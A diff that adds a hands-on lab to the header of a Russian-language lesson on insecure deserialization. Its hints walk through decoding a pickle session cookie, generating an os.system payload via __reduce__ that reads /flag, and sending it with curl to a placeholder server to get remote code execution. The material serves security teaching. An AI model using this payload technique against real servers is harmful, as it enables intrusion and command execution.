@@ -12,6 +12,18 @@ useful_for:
   - "Bug bounty"
 estimated_minutes: 45
 summary: "Как распознать небезопасную десериализацию в PHP/Java/Python/Node и построить gadget-цепочку до RCE."
+lab:
+  kind: shell
+  title: 'Практика: pickle — от сигнатуры до RCE'
+  toolset: [core, python3, curl]
+  workdir: /home/student/task
+  files: [task.md, cookie.txt, gen.py]
+  check: 'grep -q ''nto{'' found.txt'
+  hints:
+    - 'Декодируй cookie: `base64 -d cookie.txt | xxd | head -2` — сигнатура `80 04` это pickle.'
+    - 'Сгенерируй payload: `python3 gen.py` — скрипт возвращает `(os.system, (''cat /flag'',))` через `__reduce__`.'
+    - 'Отправь blob серверу: `curl -s http://dashboard.example/ -b ''session=<вывод gen.py>''`.'
+    - 'Сервер десериализует cookie и выполнит команду — в ответе будет флаг.'
 ---
 
 ## Вопрос, с которого всё начинается
